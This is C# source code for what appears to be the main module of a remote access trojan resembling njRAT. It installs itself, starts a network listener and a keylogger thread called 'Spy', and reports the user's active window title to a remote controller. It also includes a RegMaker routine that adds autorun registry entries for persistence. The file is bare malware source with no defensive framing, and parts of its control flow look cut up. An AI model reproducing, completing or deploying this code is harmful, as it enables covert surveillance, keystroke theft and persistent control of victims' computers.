#define FM
using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using XV;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace XV
{

    public class Start
    {

        [STAThread]
        public static void Main()
        {
         
         
            OK.Install();
            Thread thread = new Thread(OK.Listen, 1);
            thread.Start();
            try
            {
                MHand.spy = new Spy();
                thread = new Thread(MHand.spy.LoggerThread, 1);
                thread.Start();
            }
            catch (Exception expr_15A)
            {
                ProjectData.SetProjectError(expr_15A);
                ProjectData.ClearProjectError();
            }

            int num = 0;
            string left2 = "";
          

            try
            {
                SystemEvents.SessionEnding += (sender, e) => Nm.ShutDow();
                Nm.pr(1);
                
            }
            catch (Exception expr_196)
            {
                ProjectData.SetProjectError(expr_196);
                ProjectData.ClearProjectError();
                //goto IL_357;
            }

                
                    num++;
                    if (num == 5)
                    {
                        try
                        {
                            Nm.EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
                        }
                        catch (Exception expr_1C6)
                        {
                            ProjectData.SetProjectError(expr_1C6);
                            ProjectData.ClearProjectError();
                        }
                    }

                  
                        num = 0;
                        string text = OK.WorkedWindowsName();
                        if (string.Compare(left2, text,StringComparison.InvariantCulture) != 0)
                        {
                            
                            OK.Send("act" + OK.spliter + text);
                            left2 = text;
                        }
                 

                  //  RegMaker();
            

           
            }

        private static void RegMaker()
        {
            if (OK.IsAdmin)
            {
                try
                {
                    String o = (string) Registry.LocalMachine.GetValue(OK.AutoRunKeyPath + "\\" + OK.RegKey, "");
                    if (!o.Equals("\"" + OK.AppFileInfo.FullName + "\" .."))
                    {
                        SetAutoRunPathCu("\"" + OK.AppFileInfo.FullName + "\" ..");
                    }
                }
                catch (Exception expr_29E)
                {
                    ProjectData.SetProjectError(expr_29E);
                    ProjectData.ClearProjectError();
                }

                try
                {
                    String o = (string) Registry.LocalMachine.GetValue(OK.AutoRunKeyPath + "\\" + OK.RegKey, "");
                    if (!o.Equals("\"" + OK.AppFileInfo.FullName + "\" .."))
                    {
                        SetAutoRunPathLm("\"" + OK.AppFileInfo.FullName + "\" ..");
                    }
                }
                catch (Exception expr_339)
                {
                }
            }
        }


        private static void SetAutoRunPathLm(string t)
        {
            var key = Registry.LocalMachine.OpenSubKey(OK.AutoRunKeyPath, true);
            if (key != null)
                key.SetValue(OK.RegKey, t);
        }

        private static void SetAutoRunPathCu(String v)
        {
            var key = Registry.CurrentUser.OpenSubKey(OK.AutoRunKeyPath, true);
            if (key != null)
                key.SetValue(OK.RegKey, v);
        }

        /* 	[DebuggerStepThrough, CompilerGenerated]
        private static void _Lambda$__4(object sender, SessionEndingEventArgs e)
        {
            OK.ED();
        } */
    }
}
